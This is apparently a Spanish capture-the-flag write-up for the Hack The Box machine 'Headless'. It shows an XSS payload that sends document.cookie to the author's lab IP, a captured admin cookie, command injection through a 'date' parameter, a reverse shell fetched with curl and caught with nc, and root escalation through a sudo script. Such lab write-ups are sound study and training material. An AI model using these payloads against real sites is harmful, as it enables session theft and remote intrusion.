# HTB - HEADLESS

## Enumeración de puertos/servicios

``` bash 
sudo nmap -sCVT 10.10.11.8
```

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/cc1af630-4f2d-477d-b696-6a4e17f1ece6)

Podemos ver 2 puertos abiertos:
- 22 (SSH)
- 5000 (posiblemente una web)

Vamos a probar si funciona la ip con el puerto 5000.

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/850f9ad0-3187-4e0d-a5cc-1eabf2706e0f)


realizar un fuzzing en busca de directorios:

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/d4766bf4-277e-4c2b-a129-c646d98be7d6)


## Detección de vulnerabilidades


![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/241dc6dd-04dd-4d20-891a-94850e1c1e4e)


![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/33cdc751-0bcf-4ee8-b42f-ab14de7a8d6c)



``` javascript
<script>alert(‘XSS’)</script>
```



Después de probar con algunos xss decido mirar que hay en el directorio dashboard.
Aquí me encuentro con que no tengo acceso a la pagina por las credenciales entonces pienso que podría tener algo que ver con las cookies y el user agent. 

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/2f294528-ef0f-4640-9183-55b033e60dd9)

Busco en el navegador como podría robar las cookies para poder entrar al dashboard mediante un xss.

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/b67c57b8-9bb9-4491-9385-a25d1fafbc15)

Después de googlear un rato encuentro el siguiente xss:

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/f69baa5f-7213-4eb9-b143-225fbb06289b)

El problema es que no me servía ya que yo no tenia una web a la que me la redirigiese así que cree un python3 server para enviarme la cookie session ahí.


``` javascript
<img src=x onerror=fetch('http://10.10.14.168/?cpplie='+document.cookie);>
```

 Después de lanzar el python server lanzo el xss mediante burpsuite y lo envío

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/7e6235d8-677f-46ee-baee-f669a02da363)

Al enviarlo me devuelve en el server la cookie del admin, que es la siguiente:

cookie: "ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0"


Una vez se cambia la cookie a is_admin, ya nos dejara entrar a dashboard

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/9f4cb784-9d61-481b-928a-ddba6b524c6b)

Inspeccionando el dashboard me doy cuenta que en el burpsuite se envia un parametro llamado date.
En este parametro intento hacer un RCE inyectando lo siguiente:

date=2023-09-15; whoami

Despues de enviar la petición veo que no me da ningun tipo de error y me devuelve el nombre del user del server. 

Una vez veo que puedo hacer un RCE, intento hacer una reverse shell simple pero no me funciona asi que pruebo a crear un archivo llamado rev.sh en el cual escribo la reverse shell .

Intento hacer un curl  al python server para exportar el archivo y a su misma vez ejecuto un nc.


![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/b68edf39-9e86-499a-8c37-2eca9830b174)

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/75378874-c1d1-4c2b-bbcd-beef2b1602d0)

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/73428c24-ed07-4899-bb0e-a78eb2c43f3b)

Y funciona, ya tenemos acceso a la maquina.

Una vez dentro me dirijo a la carpeta /home/dvir y hacemos un cat  al archivo user.txt

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/ad2d1ffb-445b-42df-a178-6521a399b907)

Para hacer la escalada de privilegios, ejecutaremos el comando sudo -l que nos devolverá lo siguiente.

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/ef519537-4488-459c-ab50-e8887d954826)

Me llama la atención el párrafo del final. 
Decido hacerle un cat al archivo proporcionado (/usr/bin/syscheck) y nos devuelve un script en bash.

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/1db49c30-e4b8-4324-a3a6-919e955efb91)

1. **Verificación de permisos de root**:
    
    - El script comienza verificando si se está ejecutando como el usuario root. Esto se hace comparando el ID de usuario efectivo (`$EUID`) con 0, que es el ID de usuario del root en la mayoría de los sistemas Unix. Si el ID de usuario efectivo no es 0, el script sale con un código de salida 1, lo que indica un error.
    
1. **Última modificación del kernel**
    
	- Utiliza el comando `find` para buscar archivos de kernel (`vmlinuz*`) en el directorio `/boot`.
    - Usa el comando `stat` para obtener la marca de tiempo de la última modificación de cada archivo de kernel encontrado.
    - Ordena estas marcas de tiempo de manera numérica (`sort -n`) y toma la última usando `tail`.
    - Utiliza `date` para formatear la marca de tiempo en un formato legible y la almacena en la variable `formatted_time`.
    - Imprime la fecha y hora de la última modificación del kernel.

1. **Espacio de disco disponible**:
    
    - Usa el comando `df` para mostrar el uso de espacio en disco del sistema de archivos donde está montado `/`.
    - El comando `awk` se utiliza para extraer la cantidad de espacio disponible.
    - Imprime la cantidad de espacio disponible.
    
4. **Carga promedio del sistema**:
    
    - Utiliza el comando `uptime` para obtener la carga promedio del sistema.
    - Utiliza `awk` para extraer la carga promedio del resultado.
    - Imprime la carga promedio del sistema.

5. **Verificación del servicio de base de datos**:
    
    - Utiliza `pgrep` para verificar si el proceso llamado "initdb.sh" está en ejecución.
    - Si no se encuentra el proceso (`pgrep` devuelve un código de salida diferente de 0), imprime un mensaje indicando que el servicio de base de datos no está en ejecución y lo inicia ejecutando el script `initdb.sh`.
    - Si el proceso se encuentra en ejecución, imprime un mensaje indicando que el servicio de base de datos está en ejecución.

Finalmente, el script sale con un código de salida 0, indicando que se ha ejecutado correctamente.

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/2b547132-09ac-47f5-8799-bbdc674e991d)

Despues de ejecutar el script initdb.sh ya estamos en el user root asi que ya podemos acceder en el directorio root.

![image](https://github.com/0111100/HTB-HEADLESS/assets/96475451/ea9720f4-2e2c-44a7-857f-2fad1f1b0ab7)

